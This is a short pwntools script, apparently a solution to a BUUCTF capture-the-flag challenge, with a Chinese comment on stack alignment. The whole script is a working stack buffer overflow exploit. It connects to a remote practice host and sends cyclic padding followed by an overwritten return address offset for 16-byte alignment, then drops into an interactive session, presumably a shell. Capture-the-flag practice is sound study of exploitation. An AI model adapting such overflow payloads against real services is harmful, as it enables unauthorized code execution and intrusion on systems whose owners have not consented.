from pwn import * 
io = remote("node3.buuoj.cn",29642)
#io = process("./pwn1")
#地址+2是因为要某个指令要求地址是16字节对齐的，所以这里可以尝试+1 +2 直到+16
payload = cyclic(0xf+8)+p64(0x401186+2)
io.sendline(payload)
io.interactive()














